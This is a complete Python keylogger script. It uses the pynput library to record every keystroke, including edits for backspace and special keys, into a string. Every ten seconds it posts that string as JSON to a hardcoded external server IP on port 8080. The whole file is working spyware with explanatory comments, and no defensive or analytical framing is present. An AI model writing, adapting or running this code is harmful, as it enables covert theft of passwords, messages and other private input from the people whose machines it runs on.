from pynput import keyboard
import requests # Import the requests data to the server
import json     # To transform a Dictionary to a JSON string we need the json package.
import threading

# Global varible to save eystrokes as a string
text = ""

# Linode server IP add and port
# Dont recomend hardcoding the ip address
ip_address = "173.255.243.144"
port_number = "8080"

# Time interval in seconds for code to execute.
time_interval = 10

def send_post_req():
    try:
        # Converts Python objects into JSON string to POST to the server.
        # the format {"keyboardData" : "<value_of_text>"}
        payload = json.dumps({"keyboardData" : text})
        # We send the POST Request to the server with ip address which listens on the port as specified in the Express server code.
        # Because we're sending JSON to the server, we specify that the MIME Type for JSON is application/json.
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
        # Recursive calling for timer so it will keep updating to the server as long as the program is running.
        timer = threading.Timer(time_interval, send_post_req)
        # We start the timer thread.
        timer.start()
    except:
        print("Unable to complete request.")


# Using pynput to handle the special non hexdecimal keys.
# These special keys will be converted into string.
def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
        text += str(key).strip("'")

# on_press will actiate the listening/keylogger
with keyboard.Listener(
    on_press=on_press) as listener:
    # We start of by sending the post request to our server.
    send_post_req()
    listener.join()
